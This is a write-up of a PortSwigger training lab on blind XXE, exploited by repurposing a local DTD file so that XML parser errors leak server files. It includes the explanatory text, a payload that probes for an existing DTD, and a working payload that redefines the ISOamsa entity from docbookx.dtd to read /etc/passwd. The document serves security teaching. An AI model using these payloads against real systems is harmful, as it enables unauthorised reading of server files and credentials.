# Exploiting XXE to retrieve data by repurposing a local DTD

[Lab in PortSwigger](https://portswigger.net/web-security/xxe/blind/lab-xxe-trigger-error-message-by-repurposing-local-dtd)

## Definition
The preceding technique works fine with an external DTD, but it won't normally work with an internal DTD that is fully specified within the DOCTYPE element. This is because the technique involves using an XML parameter entity within the definition of another parameter entity. Per the XML specification, this is permitted in external DTDs but not in internal DTDs. (Some parsers might tolerate it, but many do not.)

So what about blind XXE vulnerabilities when out-of-band interactions are blocked? You can't exfiltrate data via an out-of-band connection, and you can't load an external DTD from a remote server.

In this situation, it might still be possible to trigger error messages containing sensitive data, due to a loophole in the XML language specification. If a document's DTD uses a hybrid of internal and external DTD declarations, then the internal DTD can redefine entities that are declared in the external DTD. When this happens, the restriction on using an XML parameter entity within the definition of another parameter entity is relaxed.

This means that an attacker can employ the error-based XXE technique from within an internal DTD, provided the XML parameter entity that they use is redefining an entity that is declared within an external DTD. Of course, if out-of-band connections are blocked, then the external DTD cannot be loaded from a remote location. Instead, it needs to be an external DTD file that is local to the application server. Essentially, the attack involves invoking a DTD file that happens to exist on the local filesystem and repurposing it to redefine an existing entity in a way that triggers a parsing error containing sensitive data. This technique was pioneered by Arseniy Sharoglazov, and ranked #7 in our top 10 web hacking techniques of 2018.

For example, suppose there is a DTD file on the server filesystem at the location `/usr/local/app/schema.dtd`, and this DTD file defines an entity called `custom_entity`. An attacker can trigger an XML parsing error message containing the contents of the /etc/passwd file by submitting a hybrid DTD like the following:
```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
<!ENTITY % custom_entity '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```

This DTD carries out the following steps:

- Defines an XML parameter entity called local_dtd, containing the contents of the external DTD file that exists on the server filesystem.
- Redefines the XML parameter entity called custom_entity, which is already defined in the external DTD file. The entity is redefined as containing the error-based XXE exploit that was already described, for triggering an error message containing the contents of the /etc/passwd file.
- Uses the local_dtd entity, so that the external DTD is interpreted, including the redefined value of the custom_entity entity. This results in the desired error message.

Since this XXE attack involves repurposing an existing DTD on the server filesystem, a key requirement is to locate a suitable file. This is actually quite straightforward. Because the application returns any error messages thrown by the XML parser, you can easily enumerate local DTD files just by attempting to load them from within the internal DTD.

For example, Linux systems using the GNOME desktop environment often have a DTD file at `/usr/share/yelp/dtd/docbookx.dtd`. You can test whether this file is present by submitting the following XXE payload, which will cause an error if the file is missing:
```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
%local_dtd;
]>
```

After you have tested a list of common DTD files to locate a file that is present, you then need to obtain a copy of the file and review it to find an entity that you can redefine. Since many common systems that include DTD files are open source, you can normally quickly obtain a copy of files through internet search. 

## Notes
This lab has a `Check stock` feature that parses XML input but does not display the result.

To solve the lab, trigger an error message containing the contents of the `/etc/passwd` file.

You'll need to reference an existing DTD file on the server and redefine an entity from it.

**Original Request**
```http
POST /product/stock HTTP/1.1
...

<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

**Recognition Payload**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE recon [
    <!ENTITY % local SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
    %local;
]>
<stockCheck>
    <productId>1</productId>
    <storeId>1</storeId>
</stockCheck>
```

**Malicious Payload**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE recon [
    <!ENTITY % local SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
    <!ENTITY % ISOamsa '
          <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
       <!ENTITY &#x25; wrapper "<!ENTITY &#x26;#x25; pwn SYSTEM &#x27;file:///abc/&#x25;file;&#x27;>">&#x25;wrapper;&#x25;pwn;
    '>
    %local;
]>
<stockCheck>
    <productId>1</productId>
    <storeId>1</storeId>
</stockCheck>
```

**References**  
[Automating local DTD discovery for XXE exploitation](https://www.gosecure.net/blog/2019/07/16/automating-local-dtd-discovery-for-xxe-exploitation/)

## Key Words
> xml, xxe, system dtd, local, schema, entity